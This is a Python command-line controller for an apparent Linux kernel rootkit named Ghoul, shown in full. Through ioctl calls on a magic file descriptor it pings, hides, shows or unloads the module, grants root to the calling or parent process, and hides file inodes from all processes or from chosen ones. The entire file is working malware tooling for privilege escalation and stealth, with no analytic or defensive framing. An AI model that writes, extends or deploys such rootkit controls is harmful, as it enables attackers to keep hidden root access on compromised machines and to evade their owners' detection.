#! /bin/python3
from typing import Optional

import os
import ctypes
import struct
import argparse


_ioctl = ctypes.CDLL(None).syscall
_ioctl.restype = ctypes.c_long
_ioctl.argtypes = ctypes.c_long, ctypes.c_uint, ctypes.c_uint, ctypes.c_ulong
SYSCALL_IOCTL_X86_64 = 16

# globals
service_fd = int(os.environ.get('GHOUL_FD', 0)) or 666
ping_arg = int(os.environ.get('GHOUL_PING_ARG', 0)) or 666

# service constants
SERVICE_SHOW = 0
SERVICE_UNLOAD = 1
SERVICE_CHANGE_FD = 2
SERVICE_PING = 3
SERVICE_CHANGE_PING_ARG = 4
SERVICE_GIVE_ROOT = 5
SERVICE_HIDE_FILE_INODE = 6
SERVICE_SHOW_FILE_INODE = 7

# SERVICE_GIVE_ROOT constants
THIS_PID = 0
PARENT_PID = -1

# SERVICE_SHOW_INODE constants
ALL_PIDS = 0


def service_request(cmd: int, arg: int):
    global service_fd
    return _ioctl(SYSCALL_IOCTL_X86_64, service_fd, cmd, arg)


def show():
    service_request(SERVICE_SHOW, 0)


def unload():
    service_request(SERVICE_UNLOAD, 0)


def change_fd(fd: int):
    service_request(SERVICE_CHANGE_FD, fd)
    global service_fd
    service_fd = fd


def ping(arg: Optional[int] = None):
    if arg is None:
        global ping_arg
        arg = ping_arg
    
    res = service_request(SERVICE_PING, arg)
    if res == arg:
        print('Ghoul is loaded')
        return True
    else:
        print('Ghoul is not loaded')
        return False


def change_ping_arg(new_arg: int):
    service_request(SERVICE_CHANGE_PING_ARG, new_arg)
    global ping_arg
    ping_arg = new_arg


def give_root(pid: int):
    service_request(SERVICE_GIVE_ROOT, pid)


def hide_inode(inode: int):
    service_request(SERVICE_HIDE_FILE_INODE, inode)


def show_inode(inode: int, pid: int = ALL_PIDS):    
    request_info = struct.pack('@Li', inode, pid)
    info_ptr = ctypes.addressof(ctypes.c_buffer(request_info))
    service_request(SERVICE_SHOW_FILE_INODE, info_ptr)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()

    parser.add_argument('--fd',
                        type=int,
                        help='File descriptor to use for service requests')

    subparsers = parser.add_subparsers(dest='cmd')

    subparsers.add_parser('show')
    subparsers.add_parser('unload')

    change_fd_parser = subparsers.add_parser('change-fd')
    change_fd_parser.add_argument('new_fd',
                                  type=int,
                                  help='New FD')

    ping_parser = subparsers.add_parser('ping')
    ping_parser.add_argument('--arg',
                             type=int,
                             default=ping_arg,
                             dest='ping_arg',
                             help='Argument for ping requests')

    change_ping_arg_parser = subparsers.add_parser('change-ping-arg')
    change_ping_arg_parser.add_argument('new_ping_arg',
                                        type=int,
                                        help='New ping argument')

    give_root_parser = subparsers.add_parser('give-root')
    give_root_parser.add_argument('--pid',
                                  type=int,
                                  default=PARENT_PID,
                                  help=('PID to give root to (0 is '
                                        'current process, -1 is parent '
                                        'process). Default is -1.'))

    hide_inode_parser = subparsers.add_parser('hide-inode')
    hide_inode_parser.add_argument('inode',
                                   type=int,
                                   help='Inode to hide')

    show_inode_parser = subparsers.add_parser('show-inode')
    show_inode_parser.add_argument('inode',
                                   type=int,
                                   help='Inode to show')
    show_inode_parser.add_argument('--pid',
                                   type=int,
                                   default=ALL_PIDS,
                                   help='Show inode only to specified PID')

    args = parser.parse_args()

    if args.cmd is None:
        print('Usage: ./ghoulctl.py COMMAND [ARGS]...')
        exit()

    if args.fd is not None:
        service_fd = args.fd
    
    if args.cmd == 'show':
        show()
    elif args.cmd == 'unload':
        unload()
    elif args.cmd == 'change-fd':
        change_fd(args.new_fd)
    elif args.cmd == 'ping':
        ping(args.ping_arg)
    elif args.cmd == 'change-ping-arg':
        change_ping_arg(args.new_ping_arg)
    elif args.cmd == 'give-root':
        give_root(args.pid)
    elif args.cmd == 'hide-inode':
        hide_inode(args.inode)
    elif args.cmd == 'show-inode':
        show_inode(args.inode, args.pid)
